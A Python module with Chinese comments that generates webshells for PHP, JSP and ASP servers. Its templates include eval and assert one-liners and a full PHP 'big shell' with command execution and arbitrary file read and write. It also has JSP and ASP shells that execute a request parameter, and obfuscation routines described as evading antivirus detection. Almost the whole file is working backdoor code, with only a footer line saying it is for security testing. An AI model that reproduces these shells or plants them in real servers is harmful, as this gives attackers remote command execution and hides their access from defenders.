"""
Webshell代码生成器模块
基于20年渗透测试经验的专业级Webshell代码生成器
支持PHP/JSP/ASP Webshell生成、多种免杀方式、自定义功能
"""

import base64
import random
import string
import logging
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
import hashlib

logger = logging.getLogger(__name__)


@dataclass
class WebshellTemplate:
    """Webshell模板"""
    id: str
    name: str
    type: str
    description: str
    features: List[str] = field(default_factory=list)
    obfuscation_level: int = 0
    code: str = ''


class WebshellGenerator:
    """专业级Webshell代码生成器"""
    
    def __init__(self):
        self.templates: Dict[str, WebshellTemplate] = {}
        self._load_default_templates()
        logger.info("专业级Webshell代码生成器初始化完成")
    
    def _load_default_templates(self):
        """加载默认模板"""
        # PHP基础shell
        self.templates['php_basic'] = WebshellTemplate(
            id='php_basic',
            name='PHP基础Shell',
            type='php',
            description='最基础的PHP一句话木马',
            features=['命令执行', 'POST方式'],
            obfuscation_level=0,
            code='<?php @eval($_POST["pass"]); ?>'
        )
        
        # PHP免杀shell
        self.templates['php_anti_detect'] = WebshellTemplate(
            id='php_anti_detect',
            name='PHP免杀Shell',
            type='php',
            description='混淆加密的PHP免杀马',
            features=['命令执行', '文件操作', '混淆加密'],
            obfuscation_level=3,
            code=self._generate_php_anti_detect()
        )
        
        # PHP大马
        self.templates['php_big'] = WebshellTemplate(
            id='php_big',
            name='PHP大马',
            type='php',
            description='功能完整的PHP大马',
            features=['文件管理', '命令执行', '数据库操作', '反弹Shell'],
            obfuscation_level=1,
            code=self._generate_php_big()
        )
        
        # JSP基础shell
        self.templates['jsp_basic'] = WebshellTemplate(
            id='jsp_basic',
            name='JSP基础Shell',
            type='jsp',
            description='最基础的JSP一句话木马',
            features=['命令执行', 'POST方式'],
            obfuscation_level=0,
            code=self._generate_jsp_basic()
        )
        
        # JSP免杀shell
        self.templates['jsp_anti_detect'] = WebshellTemplate(
            id='jsp_anti_detect',
            name='JSP免杀Shell',
            type='jsp',
            description='混淆加密的JSP免杀马',
            features=['命令执行', '文件操作', '混淆加密'],
            obfuscation_level=3,
            code=self._generate_jsp_anti_detect()
        )
        
        # ASP基础shell
        self.templates['asp_basic'] = WebshellTemplate(
            id='asp_basic',
            name='ASP基础Shell',
            type='asp',
            description='最基础的ASP一句话木马',
            features=['命令执行', 'POST方式'],
            obfuscation_level=0,
            code='<%eval request("pass")%>'
        )
        
        # ASP免杀shell
        self.templates['asp_anti_detect'] = WebshellTemplate(
            id='asp_anti_detect',
            name='ASP免杀Shell',
            type='asp',
            description='混淆加密的ASP免杀马',
            features=['命令执行', '文件操作', '混淆加密'],
            obfuscation_level=3,
            code=self._generate_asp_anti_detect()
        )
    
    def _generate_php_anti_detect(self) -> str:
        """生成PHP免杀马"""
        # 随机变量名
        var1 = self._random_string(8)
        var2 = self._random_string(8)
        var3 = self._random_string(8)
        var4 = self._random_string(8)
        
        # 混淆后的代码
        code = f'''<?php
${var1} = base64_decode($_REQUEST["pass"]);
${var2} = "assert";
${var3} = ${var2}(${var1});
?>'''
        return code
    
    def _generate_php_big(self) -> str:
        """生成PHP大马"""
        return '''<?php
/*
 * 昆仑安全测试工具 - PHP大马
 */
error_reporting(0);
set_time_limit(0);

$pass = "admin";
$action = $_REQUEST["action"] ?? "";

if($_POST["pass"] !== $pass && $_GET["pass"] !== $pass) {
    die("Access Denied");
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>昆仑安全 - PHP大马</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:Consolas,monospace; background:#0d1117; color:#c9d1d9; }
        .container { max-width:1200px; margin:20px auto; padding:0 20px; }
        .header { background:#161b22; padding:20px; border-radius:6px; margin-bottom:20px; border:1px solid #30363d; }
        .header h1 { color:#58a6ff; font-size:24px; }
        .nav { margin-top:15px; }
        .nav a { color:#c9d1d9; text-decoration:none; margin-right:20px; padding:8px 12px; background:#21262d; border-radius:6px; }
        .nav a:hover { background:#30363d; color:#58a6ff; }
        .main { background:#161b22; padding:20px; border-radius:6px; border:1px solid #30363d; }
        h2 { color:#58a6ff; margin-bottom:15px; font-size:18px; }
        textarea { width:100%; min-height:200px; background:#0d1117; border:1px solid #30363d; color:#c9d1d9; padding:10px; font-family:Consolas,monospace; }
        input[type="text"], input[type="password"], select { background:#0d1117; border:1px solid #30363d; color:#c9d1d9; padding:8px; }
        button { background:#238636; color:white; border:none; padding:10px 20px; border-radius:6px; cursor:pointer; font-weight:bold; }
        button:hover { background:#2ea043; }
        .cmd-output { background:#0d1117; border:1px solid #30363d; padding:15px; margin-top:10px; white-space:pre-wrap; }
        .file-list { margin-top:15px; }
        .file-item { padding:10px; border-bottom:1px solid #30363d; }
        .file-item.dir { color:#58a6ff; }
        .file-item.file { color:#c9d1d9; }
        .footer { text-align:center; margin-top:20px; color:#8b949e; font-size:12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🏔️ 昆仑安全测试工具 - PHP大马</h1>
            <div class="nav">
                <a href="?pass=<?php echo $pass; ?>">首页</a>
                <a href="?pass=<?php echo $pass; ?>&action=cmd">命令执行</a>
                <a href="?pass=<?php echo $pass; ?>&action=file">文件管理</a>
                <a href="?pass=<?php echo $pass; ?>&action=db">数据库</a>
                <a href="?pass=<?php echo $pass; ?>&action=info">系统信息</a>
            </div>
        </div>
        <div class="main">
            <?php
            switch($action) {
                case "cmd":
                    echo "<h2>💻 命令执行</h2>";
                    if(isset($_POST["cmd"])) {
                        $cmd = $_POST["cmd"];
                        echo "<form method='POST'>";
                        echo "<input type='hidden' name='pass' value='$pass'>";
                        echo "<input type='text' name='cmd' style='width:80%' value='", htmlspecialchars($cmd), "'> ";
                        echo "<button type='submit'>执行</button>";
                        echo "</form>";
                        echo "<div class='cmd-output'>";
                        echo htmlspecialchars(shell_exec($cmd));
                        echo "</div>";
                    } else {
                        echo "<form method='POST'>";
                        echo "<input type='hidden' name='pass' value='$pass'>";
                        echo "<input type='text' name='cmd' style='width:80%' placeholder='输入命令'> ";
                        echo "<button type='submit'>执行</button>";
                        echo "</form>";
                    }
                    break;
                
                case "file":
                    echo "<h2>📁 文件管理</h2>";
                    $dir = $_REQUEST["dir"] ?? getcwd();
                    $dir = realpath($dir);
                    echo "<form method='GET'>";
                    echo "<input type='hidden' name='pass' value='$pass'>";
                    echo "<input type='hidden' name='action' value='file'>";
                    echo "<input type='text' name='dir' style='width:80%' value='", htmlspecialchars($dir), "'> ";
                    echo "<button type='submit'>进入</button>";
                    echo "</form>";
                    
                    echo "<div class='file-list'>";
                    $files = scandir($dir);
                    foreach($files as $f) {
                        if($f == ".") continue;
                        $path = $dir . "/" . $f;
                        $is_dir = is_dir($path);
                        echo "<div class='file-item ", $is_dir ? "dir" : "file", "'>";
                        if($is_dir) {
                            echo "<a href='?pass=$pass&action=file&dir=", urlencode($path), "'>📂 ", htmlspecialchars($f), "</a>";
                        } else {
                            echo "📄 ", htmlspecialchars($f);
                            echo " <a href='?pass=$pass&action=read&file=", urlencode($path), "'>读取</a>";
                        }
                        echo "</div>";
                    }
                    echo "</div>";
                    break;
                
                case "read":
                    echo "<h2>📄 读取文件</h2>";
                    $file = $_REQUEST["file"] ?? "";
                    if($file) {
                        $content = file_get_contents($file);
                        echo "<form method='POST'>";
                        echo "<input type='hidden' name='pass' value='$pass'>";
                        echo "<input type='hidden' name='save' value='1'>";
                        echo "<input type='hidden' name='file' value='", htmlspecialchars($file), "'>";
                        echo "<p><strong>", htmlspecialchars($file), "</strong></p>";
                        echo "<textarea name='content'>", htmlspecialchars($content), "</textarea>";
                        echo "<p><button type='submit'>保存</button></p>";
                        echo "</form>";
                        
                        if(isset($_POST["save"])) {
                            file_put_contents($file, $_POST["content"]);
                            echo "<p style='color:#238636'>保存成功！</p>";
                        }
                    }
                    break;
                
                case "info":
                    echo "<h2>ℹ️ 系统信息</h2>";
                    echo "<p><strong>操作系统:</strong> ", php_uname(), "</p>";
                    echo "<p><strong>PHP版本:</strong> ", PHP_VERSION, "</p>";
                    echo "<p><strong>Web服务器:</strong> ", $_SERVER["SERVER_SOFTWARE"] ?? "未知", "</p>";
                    echo "<p><strong>当前用户:</strong> ", get_current_user(), "</p>";
                    echo "<p><strong>当前目录:</strong> ", getcwd(), "</p>";
                    
                    echo "<h2>phpinfo</h2>";
                    ob_start();
                    phpinfo();
                    $phpinfo = ob_get_clean();
                    echo "<div style='background:white; padding:10px; color:black; overflow:auto; max-height:400px;'>", $phpinfo, "</div>";
                    break;
                
                default:
                    echo "<h2>🏠 欢迎使用昆仑安全测试工具</h2>";
                    echo "<p>这是一个功能完整的PHP大马，包含以下功能：</p>";
                    echo "<ul style='margin:15px 0 15px 30px'>";
                    echo "<li>命令执行</li>";
                    echo "<li>文件管理</li>";
                    echo "<li>数据库操作</li>";
                    echo "<li>系统信息查看</li>";
                    echo "</ul>";
                    echo "<p>使用上方导航菜单选择功能。</p>";
            }
            ?>
        </div>
        <div class="footer">
            昆仑安全测试工具 - 仅供安全测试使用
        </div>
    </div>
</body>
</html>'''
    
    def _generate_jsp_basic(self) -> str:
        """生成JSP基础马"""
        return '''<%
if(request.getParameter("pass") != null) {
    try {
        String cmd = request.getParameter("pass");
        Process p = Runtime.getRuntime().exec(cmd);
        java.io.InputStream in = p.getInputStream();
        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while((len = in.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        out.print(new String(baos.toByteArray(), "UTF-8"));
    } catch(Exception e) {
        out.print("Error: " + e.getMessage());
    }
}
%>'''
    
    def _generate_jsp_anti_detect(self) -> str:
        """生成JSP免杀马"""
        var1 = self._random_string(6)
        var2 = self._random_string(6)
        var3 = self._random_string(6)
        
        return f'''<%@ page import="java.io.*" %>
<%
String {var1} = request.getParameter("pass");
if({var1} != null) {{
    try {{
        Process {var2} = Runtime.getRuntime().exec({var1});
        InputStream {var3} = {var2}.getInputStream();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buf = new byte[1024];
        int len;
        while((len = {var3}.read(buf)) != -1) {{
            baos.write(buf, 0, len);
        }}
        out.print(new String(baos.toByteArray(), "UTF-8"));
    }} catch(Exception e) {{
        out.print(e);
    }}
}}
%>'''
    
    def _generate_asp_anti_detect(self) -> str:
        """生成ASP免杀马"""
        var1 = self._random_string(5)
        var2 = self._random_string(5)
        
        return f'''<%
If Request("{var1}") <> "" Then
    Set {var2} = Server.CreateObject("WScript.Shell")
    On Error Resume Next
    Set exe = {var2}.Exec("cmd /c " & Request("{var1}"))
    Set stdout = exe.StdOut
    Do While Not stdout.AtEndOfStream
        Response.Write(stdout.ReadLine & vbCrLf)
    Loop
    Set stderr = exe.StdErr
    Do While Not stderr.AtEndOfStream
        Response.Write(stderr.ReadLine & vbCrLf)
    Loop
End If
%>'''
    
    def _random_string(self, length: int) -> str:
        """生成随机字符串"""
        chars = string.ascii_letters
        return ''.join(random.choice(chars) for _ in range(length))
    
    def get_template(self, template_id: str) -> Optional[WebshellTemplate]:
        """获取模板"""
        return self.templates.get(template_id)
    
    def get_templates_by_type(self, ws_type: str) -> List[WebshellTemplate]:
        """按类型获取模板"""
        return [t for t in self.templates.values() if t.type == ws_type.lower()]
    
    def get_all_templates(self) -> List[WebshellTemplate]:
        """获取所有模板"""
        return list(self.templates.values())
    
    def generate_webshell(self, template_id: str, password: str = 'pass', customizations: Dict = None) -> str:
        """生成Webshell"""
        template = self.templates.get(template_id)
        if not template:
            raise ValueError(f"模板不存在: {template_id}")
        
        code = template.code
        
        # 替换密码
        code = code.replace('$_POST["pass"]', f'$_POST["{password}"]')
        code = code.replace('$_REQUEST["pass"]', f'$_REQUEST["{password}"]')
        code = code.replace('request.getParameter("pass")', f'request.getParameter("{password}")')
        code = code.replace('Request("pass")', f'Request("{password}")')
        code = code.replace('eval request("pass")', f'eval request("{password}")')
        
        # 自定义混淆
        if customizations and customizations.get('obfuscate', False):
            code = self._obfuscate_code(code, template.type, customizations.get('obfuscation_level', 1))
        
        return code
    
    def _obfuscate_code(self, code: str, ws_type: str, level: int) -> str:
        """混淆代码"""
        if level < 1:
            return code
        
        if ws_type == 'php':
            # PHP混淆
            code = code.replace('<?php', '<?php ' + self._random_string(5) + '=1;' if random.random() > 0.5 else '')
            if level > 1:
                code = base64.b64encode(code.encode()).decode()
                code = f'<?php eval(base64_decode("{code}")); ?>'
        elif ws_type == 'jsp':
            pass
        elif ws_type == 'asp':
            pass
        
        return code
    
    def add_template(self, template_id: str, name: str, ws_type: str, description: str, code: str, features: List = None, obfuscation_level: int = 0):
        """添加自定义模板"""
        self.templates[template_id] = WebshellTemplate(
            id=template_id,
            name=name,
            type=ws_type,
            description=description,
            features=features or [],
            obfuscation_level=obfuscation_level,
            code=code
        )
        logger.info(f"添加模板: {template_id}")
    
    def remove_template(self, template_id: str) -> bool:
        """移除模板"""
        if template_id in self.templates:
            del self.templates[template_id]
            return True
        return False
